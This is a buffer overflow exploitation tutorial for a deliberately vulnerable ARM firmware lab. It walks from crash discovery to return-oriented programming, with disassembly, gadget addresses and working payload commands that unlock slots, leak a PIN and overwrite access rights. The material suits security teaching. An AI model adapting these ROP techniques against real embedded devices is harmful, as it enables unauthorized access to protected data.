@@ -1,0 +1,292 @@
+tutorial1 buffer overflow exploitation
+-----------------------------------------
+
+1) Black box exploitation
+
+Have you tried to send long messages and see if you can get any crash ?
+Crashes start with commands of 16 bytes:
+>senda AAAABBBBCCCCDDDD
+<ready...
+<AAAABBBBCCCCDDDD
+<...
+<error
+<User error: ERROR: The instruction at 0x08002BE6 tried to branch to the aligned (ARM) address 0x08002B00. This will cause a HardFault.
+<ERROR: Unable to execute: driver error. After the error occurred, the program counter (PC) was 0x8002be6.
+
+This smells like a buffer overflow.
+Seems you corrupted the last byte of the address. It's now zero, which is not an odd number, which crashes the CPU.
+Probably off by one overflow at this point. 
+
+Can you control the branch address ?
+>senda AAAABBBBCCCCDDDDEEEE
+< error
+<Call Stack:
+<  #0  PC: 0x45454544
+<
+<User error: Memory access error:
+<Checking for a code breakpoint outside mapped memory at address 0x41414140.
+<Check your memory configuration.
+<ERROR: Unable to execute: driver error. After the error occurred, the program counter (PC) was 0x41414140
+Seems you can. Your "EEEE" pointer (0x45454545) has been transfered to the PC.
+Looks like you found a buffer overflow on stack !
+
+Without any additional information, it is difficult to go further. 
+But with the format string bug, you can get the address of the buffer (0x20000464). See related help file.
+
+You can try to jump to the start of the buffer. Just put a infinite loop there for a start (opcode: 0xe7fe).
+Use address 0x20000465 instead of 0x20000464 as bit 0 must be one for thumb addresses.
+>tobin.py \he7feAABBBBCCCCDDDD\w20000465 | senda
+<
+<     IAR C-SPY Command Line Utility V8.3.2.5988
+<     Copyright 2000-2019 IAR Systems AB.
+<
+<ready...
+<@@AABBBBCCCCDDDDe?
+<Rx: read value at slot x. ex R2
+<Wxvvv: write value vvv at slot x. ex W137 writes 37 into slot 1
+<Ix: increment value in slot x
+<Uyyyyyyyy: unlock slots. yyyyy is the password. ex U1234
+<S: get status on slots
+<error
+<
+Application seems stuck, your infinite loop seems to be working !
+There is no data execution prevention enabled in this application.
+
+You could imagine writing any shellcode you want. Like dumping the code (using the printf function address aslo found thanks to format string bug).
+
+But lets assume that the application implements Data Execution Prevention. This means you cannot jump anymore to your own code in RAM.
+You have to jump to already existing code in flash (code reuse attacks).
+
+2) White box exploitation
+
+For code resue attacks it's much simpler with the binary code (in Debug/List/dissass.txt).
+Or even the source code and the map file in your case (for training purpose). 
+
+This is the function where the overflowed buffer is declared:
+void receive_and_process_command()
+{
+	unsigned char c[12];
+	unsigned int size;
+  receive_command(c, &size);
+  slot_process_command(c, size);
+}
+Only 12 bytes are reserved for the buffer, but the size of the input data which copied into this buffer is controlled by the attacker.
+Looking at the assembly code:
+                receive_and_process_command:
+  0x800'2bd0: 0xb5f8         PUSH     {R3-R7, LR}
+  0x800'2bd2: 0x4669         MOV      R1, SP
+  0x800'2bd4: 0xa801         ADD      R0, SP, #0x4
+  0x800'2bd6: 0xf000 0xf831  BL       receive_command        ; 0x800'2c3c
+  0x800'2bda: 0x9900         LDR      R1, [SP]
+  0x800'2bdc: 0xb2c9         UXTB     R1, R1
+  0x800'2bde: 0xa801         ADD      R0, SP, #0x4
+  0x800'2be0: 0xf7ff 0xfa90  BL       slot_process_command   ; 0x800'2104
+  0x800'2be4: 0xb005         ADD      SP, SP, #0x14
+  0x800'2be6: 0xbd00         POP      {PC}
+R3,R4,R5,R6 and R7 are pushed to the stack to make room for the size parameter (4 bytes) and the buffer (12 bytes + 4 bytes for alignment).
+At the end of the function, the stack pointer is incremented by 20 bytes to go back to his previous value and the return address that was pushed in the stack is restored into the PC.
+Here is the stack:
+** TOP OF THE STACK
+...
+LR      (return address, 4 bytes)
+dummy   (4 bytes)
+c buffer(12 bytes)
+size    (4 bytes)
+...
+** BOTTOM OF THE STACK
+
+So if you overflow the buffer, you are going to overwrite the function's return address, which means you can control where to return to at the end of the function.
+
+How to exploit this ?
+First you might want to unlock slots. Looking at the dissassembly file, let's see if you can find a useful fonction to return to. 
+The unlock function would be a prime target but it does return with a BX LR, not with a POP PC -LR is not stacked). This means that if you call it you won't be able to control the return address and it will crash.
+The next interesting function would be slot_unlock. If you can call it after slot rights are checked, it should work.
+
+Here is the function:
+                slot_unlock:
+  0x800'2040: 0xb538         PUSH     {R3-R5, LR}
+  0x800'2042: 0x0004         MOVS     R4, R0
+  0x800'2044: 0x000d         MOVS     R5, R1
+  0x800'2046: 0x2204         MOVS     R2, #4
+  0x800'2048: 0x0021         MOVS     R1, R4
+  0x800'204a: 0x486a         LDR.N    R0, [PC, #0x1a8]       ; info + 0x2
+  0x800'204c: 0xf000 0xf8e6  BL       memcmp                 ; 0x800'221c
+  0x800'2050: 0x2800         CMP      R0, #0
+  0x800'2052: 0xd102         BNE.N    @800205a
+  0x800'2054: 0xf7ff 0xff76  BL       unlock                 ; 0x800'1f44
+  0x800'2058: 0xe001         B.N      @800205e
+                @800205a:
+  0x800'205a: 0xf7ff 0xff6f  BL       lock                   ; 0x800'1f3c
+                @800205e:
+  0x800'205e: 0xf7ff 0xff59  BL       clear_error            ; 0x800'1f14
+  0x800'2062: 0xbd31         POP      {R0, R4, R5, PC}
+You can jump to address 0x08002054. To really benefit from it, the application should not crash. You need to find a way to return properly after unlocking.
+You can return to main function:
+                main:
+  0x800'2be8: 0xb538         PUSH     {R3-R5, LR}
+  0x800'2bea: 0x0004         MOVS     R4, R0
+  0x800'2bec: 0x000d         MOVS     R5, R1
+  0x800'2bee: 0x480d         LDR.N    R0, [PC, #0x34]        ; 0x800'2f8c
+  0x800'2bf0: 0xf7ff 0xfb48  BL       printf                 ; 0x800'2284
+                @8002bf4:
+  0x800'2bf4: 0xf7ff 0xffec  BL       receive_and_process_command
+                                                             ; 0x800'2bd0
+  0x800'2bf8: 0xe7fc         B.N      @8002bf4
+If you return to 0x08002bea, you should see the "ready..." prompt again and the application will be ready for next command. 
+The stack pointer would not be at the correct location but this is not an issue as you just want to use regular commands afterwards.
+
+So, the command would look like this:
+AAAABBBBCCCCDDDD (20 dummy bytes)
+0x08002055 (return to  middle of slot_unlock, after checks)
+AAAA  R0 (POP R0 at the end of slot_unlock)
+BBBB  R4 (POP R4 at the end of slot_unlock)
+CCCC  R5 (POP R5 at the end of slot_unlock)
+0x08002beb (POP PC, return to  main)
+
+You can try:
+>tobin.py AAAABBBBCCCCDDDD\w08002055AAAABBBBCCCC\w08002beb s r5 r6 | senda
+<ready...
+<AAAABBBBCCCCDDDDU
+<Rx: read value at slot x. ex R2
+<Wxvvv: write value vvv at slot x. ex W137 writes 37 into slot 1
+<Ix: increment value in slot x
+<Uyyyyyyyy: unlock slots. yyyyy is the password. ex U1234
+<S: get status on slots
+<error
+<ready...
+<s
+<device unlocked
+<0  RW-L
+<1  RW-L
+<2  RW-L
+<3  R--L
+<4  R-IL
+<5  RW--
+<6  R---
+<7  ----
+<ok
+<r5
+<121
+<ok
+<r6
+<122
+<ok
+
+It worked ! Device is unlocked and you can read slot 5 and 6.
+ 
+
+
+So you will have to use return oriented programming techniques to exploit this buffer overflow.
+First you could try to build a "read anywhere" ROP payload to dump all slots and the password for instance.
+
+Where to start ?
+You need to find a gadget (a small piece of code ending with POP { ..., PC}) to read anywhere.
+
+There are not many gadgets of this kind. In fact there is only one, at the end of recursive_write_digit:
+  0x800'1fda: 0x220a         MOVS     R2, #10                ; 0xa
+  0x800'1fdc: 0x5da1         LDRB     R1, [R4, R6]
+  0x800'1fde: 0xfb02 0x1000  MLA      R0, R2, R0, R1
+  0x800'1fe2: 0x3830         SUBS     R0, R0, #48            ; 0x30
+  0x800'1fe4: 0xe001         B.N      @8001fea
+                @8001fe6:
+  0x800'1fe6: 0x5da0         LDRB     R0, [R4, R6]
+  0x800'1fe8: 0x3830         SUBS     R0, R0, #48            ; 0x30
+                @8001fea:
+  0x800'1fea: 0xbd70         POP      {R4-R6, PC}
+If you can jump to 0x08001fda, you can read a byte anywhere in memory provided you can control R4 and R6.
+You could also use address 0x08001fe6, but this is less convenient as result is in R0 and is decremented by 48.
+To control R4 and R6, you can jump to address 0x08001fea. You can put the address of info structure in R4, and the index in R6.
+Last step is to print the results. You can jump to this address in the middle of slot_process_command:
+  0x800'2160: 0xa021         ADR.N    R0, . + 0x88           ; 0x80021e8
+  0x800'2162: 0xf000 0xf88f  BL       printf                 ; 0x800'2284
+  ...
+  0x800'21e6: 0xbd70         POP      {R4-R6, PC}
+                `.text_32`:
+  0x800'21e8: 0x000a'6425    DC32     0xa'6425
+This will call printf with "%d\n" format string in R0 and the data to print in R1.
+
+So the command would look like this:
+AAAABBBBCCCCDDDD (16 dummy bytes)
+0x08001feb (return to  POP R4-R6,PC to control R4 and R6) 
+0x20000130 (R4 -> address of info structure)
+BBBB  (R5 -> don't care)
+0x00000003 (R6 -> index 3 : first digit of unlock PIN code)
+0x08001fdb  (PC -> return to read gadget)
+AAAA  (R4 -> don't care)
+AAAA  (R5 -> don't care)
+AAAA  (R6 -> don't care)
+0x08002161 (printf gadget)
+BBBB  (R4 -> don't care)
+BBBB  (R5 -> don't care)
+BBBB  (R6 -> don't care)
+0x08002beb (return to main)
+
+>tobin.py AAAABBBBCCCCDDDD\w08001feb\w20000130BBBB\w00000000\w08001fdbAAAAAAAAAAAA\w08002161BBBBBBBBBBBB\w08002beb | senda
+<ready...
+<AAAABBBBCCCCDDDD@?
+<Rx: read value at slot x. ex R2
+<Wxvvv: write value vvv at slot x. ex W137 writes 37 into slot 1
+<Ix: increment value in slot x
+<Uyyyyyyyy: unlock slots. yyyyy is the password. ex U1234
+<S: get status on slots
+<error
+<1
+<error
+<ready...
+You read the first byte of the info structure, the locked field which value is 1.
+Now if you change the index from 0x00 to 0x2, 0x3, 0x4, and 0x5 you can read the PIN digits
+>tobin.py AAAABBBBCCCCDDDD\w08001feb\w20000130BBBB\w00000002\w08001fdbAAAAAAAAAAAA\w08002161BBBBBBBBBBBB\w08002beb | senda
+<50
+PIN digit 1 is 50 ('2' in ASCII).
+And if you change the index to something above 0x5, you can read slots.
+For slot 7 (index 6+7*2=20):
+>tobin.py AAAABBBBCCCCDDDD\w08001feb\w20000130BBBB\w00000014\w08001fdbAAAAAAAAAAAA\w08002161BBBBBBBBBBBB\w08002beb | senda
+< 0
+Slot 7 value is 0.
+
+
+So far you have been able to exploit this buffer overflow to unlock slots, and read anywhere you want.
+Now you should try to build a write anywhere exploit, in order to change slot access rights to full access for instance.
+
+Ideally, to overwrite access rigths without changing slot values you need a store byte gadget.
+
+There is a good gadget for this at the end of slot_write:
+  0x800'2010: 0x7188         STRB     R0, [R1, #0x6]
+  0x800'2012: 0xbd70         POP      {R4-R6, PC}
+Before calling this gadget, you need to put the info structure address in R1 and the full access value in R0 (0xFFFFFFFF).
+There are several gadgets to do this, the most convenient seems to be:
+  0x800'2c20: 0xbd13         POP      {R0, R1, R4, PC}
+ 
+So the command would look like this:
+AAAABBBBCCCCDDDD (16 dummy bytes)
+0x08002c21 (return to  POP R0,R1,R4,PC to control R0 and R1) 
+0xFFFFFFFF (R0 -> full access)
+0x2000013F (R1 -> address of info + 7*2+1 structure to overwrite slot 7 access rights)
+BBBB  (R4 -> don't care)
+0x08002011 (return to write gadget)
+AAAA  (R0 -> don't care)
+AAAA  (R1 -> don't care)
+AAAA  (R4 -> don't care)
+0x08002beb (return to main)
+
+>tobin.py AAAABBBBCCCCDDDD\w08002c21\wFFFFFFFF\w2000013FBBBB\w08002011AAAAAAAAAAAA\w08002beb s | senda
+ready...
+<AAAABBBBCCCCDDDD!,
+<...
+<s
+<device locked
+<0  RW-L
+<1  RW-L
+<2  RW-L
+<3  R--L
+<4  R-IL
+<5  RW--
+<6  R---
+<7  RWIL
+<ok
+
+You have full access to slot 7 ! 
+
+You can stop here for now. In theory you could execute any functionality you want with this technique, just by reusing parts of existing code !
+
+
